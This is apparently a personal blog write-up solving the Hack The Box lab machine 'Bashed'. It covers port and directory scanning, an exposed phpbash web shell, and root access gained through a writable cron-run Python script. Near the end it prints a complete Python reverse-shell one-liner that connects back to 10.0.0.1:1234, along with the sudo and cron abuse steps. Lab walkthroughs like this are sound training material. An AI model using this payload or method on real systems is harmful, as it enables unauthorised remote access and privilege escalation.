---
title:     "Hack The Box - Bashed"
tags: [linux,easy,sudo,cron]
categories: HackTheBox
---

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-bashed/1.png)

We are going to pwn Bashed from Hack The Box.

Link : <https://www.hackthebox.eu/home/machines/profile/118>


Like always begin with our Nmap Scan.

## Nmap Scan Results
```bash
PORT   STATE SERVICE
80/tcp open  http


80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.4 (95%), Linux 3.18 (95%), Linux 4.2 (95%), Linux 4.8 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
```

Only HTTP port is open so we can bruteforce the directories and find any way to the shell.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-bashed/2.png)

## Gobuster Results
```bash
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.68
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/12/06 00:27:13 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/css (Status: 301)
/dev (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/js (Status: 301)
/php (Status: 301)
/server-status (Status: 403)
/uploads (Status: 301)
===============================================================
2019/12/06 00:29:21 Finished
===============================================================
```

While checking the ``/dev`` there is an ``phpbash.php``<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-bashed/3.png)

Found 2 users ``arrexel and scriptmanager`` and got user flag too.

## Getting Shell

Now its time to get reverse shell to expore more

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-bashed/4.png)
Netcat didnt worked so i tried some others and perl works

Reverse Shell Cheatsheet
>http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

Copy and paste the command on the ``phpbash.php`` and listening on my machine <br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-bashed/5.png)

## Privilege Escalation

Like always I started with ``sudo -l``<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-bashed/6.png)

Looks like ``www-data`` can run any commands on the machine with the permission of ``scriptmanager`` without the password.

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-bashed/7.png)

Now time to get root, I uploaded my Linux Enumeration Script and found some writeable scripts available. 
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-bashed/8.png)

May be cronjob running on background so I started ``pspy``

>pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.

My guess is correct! 

```bash
2019/12/04 07:46:01 CMD: UID=0    PID=2297   | python test.py

2019/12/04 07:46:01 CMD: UID=0    PID=2296   | /bin/sh -c cd /scripts; for f in *.py; do python "$f"; done
```
I edited the script
 
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-bashed/9.png)

`` python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' ``

Started my listener on my machine

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-bashed/10.png)

I got Root!
